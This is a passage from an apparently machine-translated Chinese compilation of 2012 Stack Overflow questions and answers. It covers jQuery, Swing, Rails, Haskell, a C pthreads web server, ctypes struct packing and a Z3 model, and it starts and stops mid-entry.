MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Eo8jEGzm6MmLUuMYgjA
[...]
gW6qhadXVsKWQhEhVU9s7V9vJOhfeSSahvuZR0zjursTm6PSJWo7lKNgFCFC0NXO
LQIDAQAB
-----END PUBLIC KEY----- 
```

如果您将该数据提取到一个文件中并重新读取它，您将看到它包含模数和指数：

```
$ openssl rsa -in dummy.key -pubout > public.key
$ openssl rsa -in public.key -pubin -noout -text
Public-Key: (2048 bit)
Modulus:
    00:d4:4a:3c:8c:41:b3:9b:a3:26:2d:4b:8c:62:08:
    c0:fc:ad:6c:5e:5f:3f:28:e6:a3:7c:3d:43:5e:98:
    [...]
    6f:24:e8:5f:79:24:9a:86:fb:99:47:4c:e3:ba:bb:
    13:9b:a3:d2:25:6a:3b:94:a3:60:14:21:42:d0:d5:
    ce:2d
Exponent: 65537 (0x10001)
$ 
```

# jquery - 如果文本输入为空，我将如何比较它？

> ID：12659051
> 
> 赞同：0
> 
> 时间：2012-09-30T05:59:35.143
> 
> 标签：jquery

如果文本输入为空或不在 Jquery 语句中，我将如何比较它？下面的代码可以吗？

```
$(#'generate').click(function(){
   if(parseInt($('#lastname').val,10)==0){
      alert("Should Not Be Empty!");
   }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T06:15:17.757

`$(#'generate')`should be`$('#generate')`和`$('#lastname').val`should `$('#lastname').val()`，因为`val()`是一种方法。

```
$('#generate').click(function(){
   if( !$.trim( $('#lastname').val() ) ){
      alert('Should Not Be Empty!');
   }
} 
```

但是您尝试`parseInt($('#lastname').val(),10)`了 which 将输出`NaN`if, input box 为空，而不是 give `0`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T06:02:36.317

你的意思是：

```
if($.trim( $('#lastname').val() ) != ""){
    alert("Should Not Be Empty!");
} 
```

或者

```
if($.trim( $('#lastname').val() ).length  > 0){
    alert("Should Not Be Empty!");
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T06:14:00.253

简单地

```
$('#generate').click(function(){
    if($('#lastname').val().trim() != "") {
       alert("Should Not Be Empty!");
    }
} 
```

另外，有错别字

```
 $(#'generate').click(function(){
//   ^   Right here 
```

# java - java Swing - 扩展 JComponent 类以创建文本编辑器组件

> ID：12659056
> 
> 赞同：0
> 
> 时间：2012-09-30T06:00:53.743
> 
> 标签：java, swing, jcomponent

我希望通过扩展 Java swing - JComponent 类来创建一个文本编辑组件。

应该为该组件设置的 UI 外观和感觉应该是什么？

我试过这个：

```
public void updateUI(){
     setUI((TextUI)UIManager.getUI(this));
      invalidate();
} 
```

但是，这会引发异常：

```
UIDefaults.getUI() failed: no ComponentUI class for: com.gatech.ui.courier.TextComponent 
```

TextComponent.java 是我扩展 JComponent 的类。

我错过了什么？有没有其他方法可以创建自己的文本编辑组件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-18T14:17:09.020

尝试插入方法

```
public String getUIClassID() {
    return "TextPaneUI";
} 
```

在您的 TextComponent 中。因此，您可以从 JTextPane 获取 UI。我认为 JComponent 没有 UI（如果有的话 - 它不是 TextUI）。但是如果您创建自己的组件 - 您可能需要创建自定义 UI。

# ruby-on-rails - Rails, MongoMapper 嵌套数组在 HAML 表单中的麻烦

> ID：12659064
> 
> 赞同：0
> 
> 时间：2012-09-30T06:02:20.410
> 
> 标签：ruby-on-rails, forms, mongodb, haml

我越来越

**# 的未定义方法“Carrots”**（引用 ln#18）

尝试使用以下表单进行编辑时：

```
= form_for @harvest do |f|
  - if @harvest.errors.any?
    #error_explanation
      %h2= "#{pluralize(@harvest.errors.count, "error")} prohibited this harvest from being saved:"
      %ul
        - @harvest.errors.full_messages.each do |msg|
          %li= msg

  .field
    = f.label :created_at
    = f.text_field :created_at, :disabled => true
    %br
    = f.label :photo
    = f.text_field :photo
    %h2 Crops
    - @harvest.harvested_crops.each do |harvested_crop|
      = f.label :harvested_crop['crop']
      = f.select harvested_crop['crop'], Crop.all.collect {|p| [ p.name, p.id ] }, {:include_blank => ''}
      = f.label :harvested_crop['amount']
      = f.text_field harvested_crop['amount']

  %br
  .actions
    = f.submit 'Save' 
```

使用以下数据：

```
{ "_id" : ObjectId("5067846f37bca62bccc3729e"), "user_id" : "5067844637bca62bccc3729c", "photo" : "carrotsnspuds.jpg", "harvested_crops" : [    {   "crop" : "Carrots",     "amount" : 1112.15 },   {   "crop" : "Potatoes",    "amount" : 3212.44 } ] } 
```

我已经为 MongoMapper、Rails 和 Embedded 文档尝试了相关的 Stack Overflow 问题，但我没有任何运气，可能是因为这是一个嵌套数组而不是 EmbeddedDocument。我还没有使用 Formtastic 或任何东西，只是想先了解这里所需的语法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T21:39:53.723

这绝对不是有效的，但这让我能够完成工作：

```
= form_for @harvest do |f|
  - if @harvest.errors.any?
    #error_explanation
      %h2= "#{pluralize(@harvest.errors.count, "error")} prohibited this harvest from being saved:"
      %ul
        - @harvest.errors.full_messages.each do |msg|
          %li= msg

  .field
    = f.label :created_at
    = f.text_field :created_at, :disabled => true
    %br
    = f.label :photo
    = f.text_field :photo
    %h2 Crops
    - x = 0
    - @harvest.harvested_crops.each do |harvested_crop|
      = f.fields_for "harvested_crops[]", harvested_crop do |hc|
        %b Harvested Crop
        %select{:name => "harvest[harvested_crops][" + x.to_s + "][crop]"}
          - Crop.all.collect.each do |crop_name|
            - if harvested_crop['crop'] == crop_name[:name]
              %option{:selected => "selected", :value => crop_name[:name]}
                = crop_name[:name]
            - else
              %option{:value => crop_name[:name]}
                = crop_name[:name]
        %b Amount
        %input{:name => "harvest[harvested_crops][" + x.to_s + "][amount]", :value => harvested_crop['amount']}/
        %br
        - x += 1

  %br
  .actions
    = f.submit 'Save' 
```

# ruby-on-rails - layouts vs. shared vs. helpers 文件夹（以及何时使用部分）

> ID：12659071
> 
> 赞同：0
> 
> 时间：2012-09-30T06:03:17.227
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我正在尝试构建一个应用程序，但我开始对何时使用部分而不是简单地重构代码感到困惑。换句话说，我什么时候应该使用'render'和'render partial：........"

如果我在“views”下的“shared”文件夹中放了一些东西，这是否会使其成为部分内容？不确定何时使用这些不同的文件夹。非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T06:17:44.053

通常你使用'render'来移动一些html代码，比如“footer”。

如果您希望部分具有自己的布局或在其中传递变量。我们将使用'render :partial'

```
<%= render "footer" %> # Basic usage
<%= render "shared/footer" %> # _footer.html will be placed in "shared/_footer.html"

<%= render :partial => "sidebar", :layout => "sidebar_layout" %>
# It will using "_sidebar_layout" as a layout template for "_sidebar.html"

<%= render :partial => "form", :locals => { :post => @post } %>
# Passing @post variable as post in form partial 
```

参考： http: [//guides.rubyonrails.org/layouts_and_rendering.html#using-partials](http://guides.rubyonrails.org/layouts_and_rendering.html#using-partials)

# html - 额外的 s在IE8和IE9中生成

> ID：12659073
> 
> 赞同：0
> 
> 时间：2012-09-30T06:04:05.070
> 
> 标签：html, css, html-lists

我正在建立一个新的网站/登陆页面。如果您转到底部的右栏（图片），您将看到`<li>`容器中带有图片的 s。一切都很好，除了在 IE8 和 IE9 中，在第 2 和第 3 张图片之间以及第 3 和第 4 张图片之间会生成额外的空白图片容器。就好像那里应该有一个缩略图，但容器中什么都没有。

[http://mattmillermusic.com.previewdns.com](http://mattmillermusic.com.previewdns.com)

也许这只是代码失明的情况，因为我已经在我的电脑前一段时间了，但我觉得奇怪的是这些空的 LI 没有出现在其他浏览器（或 IE7）中。

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T06:07:43.593

这是因为您的标记中有错误。某些元素没有结束标签。

![在此处输入图像描述](../Images/39e0cca52b5ac7a174fe30c2bfdf5c82.png)

在图片中，如您所见（红色）。浏览器通过自动插入它们进行补偿，在此过程中创建冗余元素。

如您所见，从第二个开始，您没有`<a>`元素的结束标签。`<li>`

# xcode - 在另一台 Mac 上部署 Phonegap 2.x 应用程序开发

> ID：12659074
> 
> 赞同：1
> 
> 时间：2012-09-30T06:04:06.040
> 
> 标签：xcode, html, cordova

我曾经使用 1.x PhoneGap 库或 Cordova 库来开发 PhoneGap 应用程序。之后，我使用了 Cordova 2.x 库，我很困惑。

我将我的资源推送到 Github 并让我的朋友分叉它。我们不知道如何在另一台 Macbook 上部署开发环境，即使该 Macbook 具有 Cordova 2.x 库。

首先，我们发现该项目没有 Cordova 库。所以，我们在项目中添加了 Cordova 2.x 库。但是 Xcode 给了我们一个错误。

如果我构建 Cordova Lib Xcode 说：

> 文件 /Users/[MYUSERNAME]/Library/Developer/Xcode/DerivedData/[MYAPPNAME]-gfayprtpflnyaqcwfmepqwlyjglq/Build/Products/Debug-iphonesimulator/libCordova.a 依赖于自身。这个目标可能包括它自己的产品。构建科尔多瓦 2.x 库

如果我构建`MYAPPNAME`Xcode 说：

> 未知类型名称“CDVViewController”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T20:26:53.753

在 phonegap 文件夹中，您会找到一个名为 update script 的东西，运行它并给它您的项目地址，它应该可以完成这项工作（更新参考资料等）您可以在 phonegap 网站上找到更多信息

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:39:26.177

最后我通过阅读这篇文章解决了我的问题。

并按照作者所说的步骤...

这是链接：http: [//zsprawl.com/iOS/2012/10/installing-cordovaphonegap-2-1-for-ios/](http://zsprawl.com/iOS/2012/10/installing-cordovaphonegap-2-1-for-ios/)

# haskell - 定义一个haskell函数 [IO a] -> IO[a]

> ID：12659076
> 
> 赞同：1
> 
> 时间：2012-09-30T06:04:23.787
> 
> 标签：haskell, recursion, io

我正在做一个haskell练习，关于定义一个函数accumulate :: [IO a] -> IO [a]，它执行一系列交互并将它们的结果累积到一个列表中。

让我困惑的是如何表达 IO a 的列表？（行动：行动）？？

如何使用 IO 编写递归代码？

这是我的代码，但这些存在一些问题......

```
accumulate :: [IO a] -> IO [a]
accumulate (action:actions) = do 
                                value <- action
                                list <- accumulate (action:actions)
                                return (convert_to_list value list)

convert_to_list:: Num a =>a -> [a]-> [a]
convert_to_list a [] = a:[]
convert_to_list x xs = x:xs 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-30T07:20:46.667

您要实现的内容`sequence`来自`Control.Monad`.

只是为了让您找到答案而不是给出答案，请尝试`[IO a] -> IO [a]`在[hoogle](http://www.haskell.org/hoogle)上搜索（当您选择功能时，页面右侧有一个*Source链接）。*

尝试在您的代码中查看当操作列表为空列表时会发生什么，并查看序列如何处理该问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T07:20:37.213

已经有这样的函数`Control.Monad`并且它被调用了`sequence`（不，你不应该看它）。您应该指出在命名过程中做出的重要决定。从技术上讲`[IO a]`，没有说明这些`Monad`s 应该以何种顺序相互连接，但名称`sequence`具有顺序连接的含​​义。

至于解决你的问题。我建议更多地查看类型并听取@sacundim 的建议。在 GHCi（来自 Glasgow Haskell Compiler 的解释器）中，有一种很好的方法来检查类型并因此理解表达式（`:t (:)`将返回`(:) :: a -> [a] -> [a]`它应该提醒您一个自己的函数，但限制较少的类型）。

首先，我会尝试通过更简单的示例查看您所展示的内容。

```
data MyWrap a = MyWrap a

accumulate :: [MyWrap a] -> MyWrap [a]
accumulate (action:actions) = MyWrap (convert_to_list value values) where
    MyWrap value = action -- use the pattern matching to unwrap value from action
    -- other variant is:
    -- value = case action of
    --             MyWrap x -> x
    MyWrap values = accumulate (action:actions) 
```

我犯了你故意犯的同样的错误，但差别很小（`values`是一个提示）。正如您可能已经被告知的那样，您可以通过尝试内联适当的函数定义来尝试解释您的任何程序。即匹配等号 ( ) 左侧的定义`=`并将其替换为右侧。在您的情况下，您有无限循环。尝试在此示例或您的示例上解决它，我想您会理解的（顺便说一句，您的问题可能只是一个错字）。

*更新：*当您的程序在运行时出现有关模式匹配的消息时，不要害怕。当你把你的函数称为`accumulate []`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T07:17:56.057

可能您正在寻找`sequence`映射的功能`[m a] -> m [a]`？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-01T02:42:52.637

因此，您的问题的简短答案是，您的代码（几乎）没有任何问题。

首先，它进行类型检查：

```
Prelude> let accumulate (action:actions) = do { value <- action ; 
          list <- accumulate (action:actions) ; return (value:list) }
Prelude> :t accumulate
accumulate :: (Monad m) => [m t] -> m [t] 
```

为什么我`return (value:list)`在那里使用？看看你的第二个功能，它只是`(:)`. 打电话`g`

```
g a [] = a:[]
g a xs = a:xs 
```

`(:)`与使用相同参数调用相同。这就是所谓的“eta 减少”：（`(\x-> g x) === g`读`===`作“等效”）。

所以现在你的代码只剩下一个问题了。您已经`value <- action`从动作中取出了一个值，那么为什么要在 中重用该动作`list <- accumulate (action:actions)`？你真的必须吗？现在你有，例如，

```
accumulate [a,b,c]  ===
do { v1<-a; ls<-accumulate [a,b,c]; return (v1:ls) } ===
do { v1<-a; v2<-a; ls<-accumulate [a,b,c]; return (v1:v2:ls) } ===
do { v1<-a; v2<-a; v3<-a; ls<-accumulate [a,b,c]; return (v1:v2:v3:ls) } ===
..... 
```

一个简单的修复，你就在那里。

# c# - 获取相互连接的计算机信息

> ID：12659079
> 
> 赞同：0
> 
> 时间：2012-09-30T06:04:45.040
> 
> 标签：c#, networking

如何获取连接到我的计算机的计算机的信息？它是计算机名称和 IP 地址。我使用 C# 作为我的编程语言

我正在使用交叉电缆连接两台计算机。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T06:15:31.513

您应该知道的第一件事是，当您将某些东西连接到以太网时，无论是否使用交叉电缆，该网络上的设备都不需要实际发送任何东西。没有消息说“哦，嗨，我是这个网络的新手，想把我介绍给邻居吗？”

话虽如此，连接设备时**通常**会有一系列活动。在大多数网络上，有一个称为 DHCP 服务器的东西会发送配置，例如 IP 地址、网络掩码、DNS 服务器地址等。同样，这不是配置所必需的。许多设备是手动配置的，不使用 DHCP。通常网络不需要使用 DHCP。但是，这是一个好的开始。

您需要做的是一些数据包嗅探。基本上，编写软件来侦听通过网络接口的所有数据包，并过滤掉您感兴趣的数据包[。Winpcap 有一个 .NET 包装器](http://pcapdotnet.codeplex.com/)，它是 Windows 的数据包捕获驱动程序。这应该让你开始。

侦听设置为以太网广播的数据包 ( `FF:FF:FF:FF:FF:FF`)。在 IP 网络上，您可以使用 ARP 来获取该主机的 IP 地址。

如果您感兴趣，Windows 网络信息也通过广播发送。

要了解您要查找的内容，请下载[Wireshark](http://www.wireshark.org/download.html)并进行查看。

# batch-file - 用于跨多个文件夹重命名文件的批处理脚本

> ID：12659080
> 
> 赞同：0
> 
> 时间：2012-09-30T06:04:52.460
> 
> 标签：batch-file, rename

我有一个批处理脚本，它重命名文件夹中的文件，如下所示：

```
ren B:\Backups\*.bc_ *.bc 
```

现在我在许多文件夹之间有文件，备份每天都会创建一个新名称的新文件夹，我需要跨多个文件夹重命名文件。我该怎么做？在这种情况下如何正确使用通配符？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T06:30:15.423

您不能在 REN 语句的路径中使用通配符。您将不得不使用某种形式的 FOR 命令。

假设您要重命名以 B:\Backups 为根的整个文件夹层次结构中的所有 *.bc_ 文件。

您可以使用 FOR /R 迭代层次结构中的所有 .bc_ 文件并单独重命名每个文件。

```
for /r "B:\Backups" %%F in (*.bc_) do ren "%%F" "%%~nF.bc" 
```

或者您可以使用 FOR /D /R 来迭代根目录下的所有文件夹并对每个文件夹运行通配符 REN

```
for /d /r "B:\Backups" %%F in (.) do ren "%%F\*.bc_" *.bc 
```

上面的两个命令都设计用于批处理脚本。如果要从命令行而不是从批处理文件中运行命令，请将每个双百分比更改为单百分比。

# asp.net-web-api - ASP.NET Web API、405 状态码和异常处理

> ID：12659081
> 
> 赞同：1
> 
> 时间：2012-09-30T06:05:00.293
> 
> 标签：asp.net-web-api, http-status-codes, http-status-code-405

有没有办法在 Web API 上捕获 405 并在发送错误的动词时返回自定义消息？我使用 ExceptionFilterAttribute 捕获了 500 个。我想返回一个 JSON 或 XML 对象。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T15:11:52.587

HttpStatusCode.MethodNotAllowed 是您的朋友。

[http://msdn.microsoft.com/en-us/library/system.net.httpstatuscode.aspx](http://msdn.microsoft.com/en-us/library/system.net.httpstatuscode.aspx)

在您的过滤器中检查 Request.StatusCode 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T06:07:55.283

您可以使用 System.Web 中的 customErrors 元素在 web.config 中设置它。

```
<customErrors defaultRedirect="url" mode="On">
   <error statusCode="statuscode" redirect="url"/>
</customErrors> 
```

# java - IntelliJ：可执行 jar 的自动工件发现

> ID：12659086
> 
> 赞同：0
> 
> 时间：2012-09-30T06:06:35.380
> 
> 标签：java, maven, intellij-idea

目前使用 IntelliJ，我根本不使用 maven 命令行进行开发 - IntelliJ 检测项目中的战争工件并自动在项目结构 - > 工件中生成工件配置，然后我可以将其包含在“build on make”或运行中配置。

但是对于似乎没有发生的可执行 jar。这仅仅是 IntelliJ 的疏忽，还是我做错了什么？换句话说，有没有办法告诉 intelliJ 也为 jar 模块执行这种自动发现和创建工件配置？

这是一张图片来说明我所指的内容：

![IntelliJ 项目工件窗口](../Images/b6934fe14d255b31b72c4019acc306a2.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T10:13:18.427

尚不支持，请`pom.xml`向[IntelliJ IDEA YouTrack 项目](http://youtrack.jetbrains.net/issues/IDEA)提交带有示例的功能请求。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T12:18:47.960

没有标准的方法来描述 pom 文件中的可执行 jar（此外，您可以制作一个可执行的 .war，扩展名没有区别）。因为这样的 jar 只是带有主类清单条目的普通 jar 存档。所以，IDEA 不能从 pom.xml 中扣除。

此外，它没有任何意义，因为网络服务器部署需要战争。`public static void main`在 IDEA 中，您可以在具有该方法的任何源中运行任何类。

# jquery - 等待 Modernizr 从用户脚本加载 jQuery

> ID：12659088
> 
> 赞同：0
> 
> 时间：2012-09-30T06:06:54.610
> 
> 标签：jquery, greasemonkey, userscripts, modernizr

我正在研究一个谷歌浏览器用户脚本，它增强了一个通过[Modernizr 的](http://modernizr.com/docs/#load)[方法加载](http://modernizr.com/docs/#load)[jQuery](http://jquery.com)的网站。[`.load()`](http://modernizr.com/docs/#load)

我将使用站点的 jQuery 实例，但用户脚本在 jQuery 加载之前开始执行。

是否有一种确定的方法可以从 Greasemonkey 脚本或用户脚本中拦截 Modernizr 的`load()`/机制？`complete`

还是轮询`window[jQuery]`/`'$' in window`等是唯一的解决方案？

（我试图避免加载我自己的 jQuery 实例，并且通过轮询，我有时会错过对要使用[突变观察者](https://developer.mozilla.org/en-US/docs/DOM/MutationObserver)拦截的文档的第一次更改。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T18:08:14.830

听起来您需要等待一切都已加载时触发的 window.onload 。

Document-end 和 document-idle 都保证在整个 DOM 被解析后运行，这通常是脚本开发人员感兴趣的事情。如果由于某种原因你真的需要你的脚本在 window.onload 之后运行，你可以检查 document.readystate 属性。如果它是“完整的”，那么您可以假设已经发生了 onload。如果不是，那么您可以监听 onload。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-19T14:37:26.727

我不确定你想做什么，但下面的脚本可能会对你有所帮助。它将延迟您的 html 页面中的任何内联脚本，并在 Modernizr 在返回时加载所有脚本后执行。

在modernizr加载函数之前定义下面的行。

```
docready=[],$=function(){return{ready:function(fn){docready.push(fn)}}}, 
```

在modernizr加载完成时写下脚本

```
$ = jQuery;
jQuery(document).ready(function() {
    for(n in docready) docready[n]();
}); 
```

# google-apps - 域中的 Google Apps

> ID：12659089
> 
> 赞同：0
> 
> 时间：2012-09-30T06:06:56.610
> 
> 标签：google-apps, user-registration

我正在考虑在我的网站上使用谷歌应用程序，这样我就可以使用电子邮件服务、日历来显示事件和文档，以便用户可以上传文件并将其保存到谷歌文档中。但是我有一个关于定价的问题，我一直在网站上阅读，但我似乎无法回答我的问题。对于谷歌应用程序的免费版本，它说最大用户数为 10，这是什么意思？谁是用户？他们是否意味着最多 10 人可以在您的网站上注册一个帐户并使用这些应用程序？

我将有几百个注册，所以如果这是最大用户的意思，那么有人可以推荐一个替代方案，我主要只需要文档（电子邮件会很好）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T06:09:26.830

最大用户数意味着您只能创建 10 个用户 - 电子邮件地址（不计算别名）。

# c - C中的Boss Worker Pthreads Web服务器-如果发送的请求多于线程数，服务器将崩溃

> ID：12659093
> 
> 赞同：5
> 
> 时间：2012-09-30T06:07:46.813
> 
> 标签：c, multithreading, pthreads, mutex, condition-variable

我正在使用 Pthreads（我更讨厌）用 C 语言（我很讨厌）编写一个 Web 服务器，但我被困在了这一点上。服务器的模型是boss-worker，因此boss线程在程序开始时实例化所有工作线程。有一个全局队列存储传入连接的套接字。老板线程是在接受连接时将所有项目（套接字）添加到队列中的线程。然后，所有工作线程等待将一个项目添加到全局队列中，以便它们开始处理。

只要我连接到它的次数少于服务器拥有的工作线程数，服务器就可以正常工作。因此，我认为要么是我的互斥体有问题（可能信号丢失了？），要么线程在运行一次后被禁用（这可以解释为什么如果有 8 个线程，它只能解析第一个8 个 http 请求）。

这是我的全局队列变量。

```
int queue[QUEUE_SIZE]; 
```

这是主线。它使用入队、出队、空等方法创建一个队列结构（在别处定义）。当服务器接受连接时，它将传入连接所在的套接字入队。一开始调度的工作线程不断检查这个队列，看是否添加了任何作业，如果有作业，则它们将套接字出列，连接到该端口，并读取/解析/写入传入的 http 请求.

```
int main(int argc, char* argv[])
{
int hSocket, hServerSocket;  /* handle to socket */
struct hostent* pHostInfo;   /* holds info about a machine */
struct sockaddr_in Address; /* Internet socket address stuct */
int nAddressSize = sizeof(struct sockaddr_in);
int nHostPort;
int numThreads;
int i;

init(&head,&tail);

//**********************************************
//ALL OF THIS JUST SETS UP SERVER (ADDR STRUCT,PORT,HOST INFO, ETC)
if(argc < 3) {
    printf("\nserver-usage port-num num-thread\n");
    return 0;
}
else {
    nHostPort=atoi(argv[1]);
    numThreads=atoi(argv[2]);
}

printf("\nStarting server");

printf("\nMaking socket");
/* make a socket */
hServerSocket=socket(AF_INET,SOCK_STREAM,0);

if(hServerSocket == SOCKET_ERROR)
{
    printf("\nCould not make a socket\n");
    return 0;
}

/* fill address struct */
Address.sin_addr.s_addr = INADDR_ANY;
Address.sin_port = htons(nHostPort);
Address.sin_family = AF_INET;

printf("\nBinding to port %d\n",nHostPort);

/* bind to a port */
if(bind(hServerSocket,(struct sockaddr*)&Address,sizeof(Address)) == SOCKET_ERROR) {
    printf("\nCould not connect to host\n");
    return 0;
}
/*  get port number */
getsockname(hServerSocket, (struct sockaddr *) &Address,(socklen_t *)&nAddressSize);

printf("Opened socket as fd (%d) on port (%d) for stream i/o\n",hServerSocket, ntohs(Address.sin_port));

printf("Server\n\
      sin_family        = %d\n\
      sin_addr.s_addr   = %d\n\
      sin_port          = %d\n"
      , Address.sin_family
      , Address.sin_addr.s_addr
      , ntohs(Address.sin_port)
    );
//Up to this point is boring server set up stuff. I need help below this.
//**********************************************

//instantiate all threads
pthread_t tid[numThreads];

for(i = 0; i < numThreads; i++) {
    pthread_create(&tid[i],NULL,worker,NULL);
}

printf("\nMaking a listen queue of %d elements",QUEUE_SIZE);
/* establish listen queue */
if(listen(hServerSocket,QUEUE_SIZE) == SOCKET_ERROR) {
    printf("\nCould not listen\n");
    return 0;
}

while(1) {

    pthread_mutex_lock(&mtx);
    printf("\nWaiting for a connection");

    while(!empty(head,tail)) {
        pthread_cond_wait (&cond2, &mtx);
    }

    /* get the connected socket */
    hSocket = accept(hServerSocket,(struct sockaddr*)&Address,(socklen_t *)&nAddressSize);

    printf("\nGot a connection");

    enqueue(queue,&tail,hSocket);

    pthread_mutex_unlock(&mtx);
    pthread_cond_signal(&cond);     // wake worker thread
}
} 
```

这是工作线程。这应该始终运行检查新请求（通过查看队列是否为空）。在这个方法结束时，它应该推迟回到老板线程以等待下一次需要它。

```
void *worker(void *threadarg) {

pthread_mutex_lock(&mtx);

while(empty(head,tail)) {
    pthread_cond_wait(&cond, &mtx);
}
int hSocket = dequeue(queue,&head);

unsigned nSendAmount, nRecvAmount;
char line[BUFFER_SIZE];

nRecvAmount = read(hSocket,line,sizeof line);
printf("\nReceived %s from client\n",line);

//***********************************************
//DO ALL HTTP PARSING (Removed for the sake of space; I can add it back if needed)
//*********************************************** 

nSendAmount = write(hSocket,allText,sizeof(allText));

if(nSendAmount != -1) {
    totalBytesSent = totalBytesSent + nSendAmount;
}
printf("\nSending result: \"%s\" back to client\n",allText);

printf("\nClosing the socket");
/* close socket */
if(close(hSocket) == SOCKET_ERROR) {
    printf("\nCould not close socket\n");
    return 0;
}

pthread_mutex_unlock(&mtx);
pthread_cond_signal(&cond2);
} 
```

任何帮助将不胜感激。如果有人需要，我可以发布更多代码，请告诉我。我不是最擅长操作系统的东西，尤其是在 C 语言中，但我知道互斥锁的基础知识，cond。变量、信号量等。就像我说的，我会尽我所能获得帮助。（另外，我不确定我是否完全正确地发布了代码，因为这是我的第一个问题。让我知道是否应该更改格式以使其更具可读性。）

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-30T11:30:04.900

工人革命的时候了。

工作线程似乎缺少一个 while(true) 循环。在 HTTP 交换并关闭套接字之后，它们应该循环返回以在队列中等待更多套接字/请求。

# struct - Python ctypesgen/ctypes：如何以单字节对齐方式将结构字段写入文件

> ID：12659094
> 
> 赞同：3
> 
> 时间：2012-09-30T06:07:50.713
> 
> 标签：struct, ctypes

使用 ctypesgen，我生成了一个结构体（我们称之为 mystruct），其字段定义如下：

```
[('somelong', ctypes.c_long),
 ('somebyte', ctypes.c_ubyte)
 ('anotherlong', ctypes.c_long),
 ('somestring', foo.c_char_Array_5),
 ] 
```

当我尝试将该结构的一个实例（我们称之为 x）写出到文件中时： open(r'rawbytes', 'wb').write(mymodule.mystruct(1, 2, 3, '12345')),我注意到写入文件的内容不是字节对齐的。

我应该如何将该结构写出以使字节对齐为 1 个字节？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T15:46:30.277

Define `_pack_=1` before defining `_fields_`.

Example:

```
from ctypes import *
from io import BytesIO
from binascii import hexlify

def dump(o):
    s=BytesIO()
    s.write(o)
    s.seek(0)
    return hexlify(s.read())

class Test(Structure):
    _fields_ = [
        ('long',c_long),
        ('byte',c_ubyte),
        ('long2',c_long),
        ('str',c_char*5)]

class Test2(Structure):
    _pack_ = 1
    _fields_ = [
        ('long',c_long),
        ('byte',c_ubyte),
        ('long2',c_long),
        ('str',c_char*5)]

print dump(Test(1,2,3,'12345'))
print dump(Test2(1,2,3,'12345')) 
```

Output:

```
0100000002000000030000003132333435000000
0100000002030000003132333435 
```

Alternatively, use the `struct` module. Note it is important to define the endianness `<` which outputs the equivalent of `_pack_=1`. Without it, it will use default packing.

```
import struct
print hexlify(struct.pack('<LBL5s',1,2,3,'12345')) 
```

Output:

```
0100000002030000003132333435 
```

# z3 - 与饱和结果相比，Z3 是否需要更长的时间才能给出未饱和结果？

> ID：12659098
> 
> 赞同：0
> 
> 时间：2012-09-30T06:08:09.747
> 
> 标签：z3

根据我的经验，在较大型号的情况下，我发现与饱和情况相比，Z3 需要更长的时间才能给出不饱和结果。甚至有时Z3会无限运行而没有给出任何答案。下面我举一个这样的例子。[虽然我使用 .NET API 进行形式化，但我在这里写的是等效的 SMT-LIB 2 代码。]

```
(declare-fun VCapacity (Int) Int)
(declare-fun VChargeInit (Int) Int)
(declare-fun VChargeEnd (Int) Int)
(declare-fun VStartAt (Int) Int)
(declare-fun VEndAt (Int) Int)
(declare-fun VCRate (Int) Int)
(declare-fun VChargeAt (Int Int) Int)
(declare-fun VFunctionAt (Int Int) Int)
(declare-fun VCCharge (Int Int) Int)
(declare-fun VCDischarge (Int Int) Int)
(declare-fun VCFReg (Int Int) Int)
(declare-fun TotalCChargeAt (Int) Int)
(declare-fun TotalCDischargeAt (Int) Int)
(declare-fun TotalCFRegAt (Int) Int)

(declare-const Total Int)

(assert (and (= (VStartAt 1) 1)
     (= (VEndAt 1) 4)
     (= (VCapacity 1) 30)
     (= (VChargeEnd 1) 20)
     (= (VCRate 1) 10)
     (= (VChargeInit 1) 10)
     (= (VChargeAt 1 0) 10)))
(assert (and (= (VChargeAt 1 5) 0)
     (= (VChargeAt 1 6) 0)
     (= (VChargeAt 1 7) 0)
     (= (VChargeAt 1 8) 0)))
(assert (and (= (VStartAt 2) 2)
     (= (VEndAt 2) 7)
     (= (VCapacity 2) 40)
     (= (VChargeEnd 2) 30)
     (= (VCRate 2) 10)
     (= (VChargeInit 2) 20)
     (= (VChargeAt 2 1) 20)))
(assert (and (= (VChargeAt 2 0) 0) (= (VChargeAt 2 8) 0)))
(assert (and (= (VStartAt 3) 4)
     (= (VEndAt 3) 6)
     (= (VCapacity 3) 20)
     (= (VChargeEnd 3) 20)
     (= (VCRate 3) 10)
     (= (VChargeInit 3) 10)
     (= (VChargeAt 3 3) 10)))
(assert (and (= (VChargeAt 3 0) 0)
     (= (VChargeAt 3 1) 0)
     (= (VChargeAt 3 2) 0)
     (= (VChargeAt 3 7) 0)
     (= (VChargeAt 3 8) 0)))
(assert (and (= (VStartAt 4) 5)
     (= (VEndAt 4) 8)
     (= (VCapacity 4) 30)
     (= (VChargeEnd 4) 20)
     (= (VCRate 4) 10)
     (= (VChargeInit 4) 0)
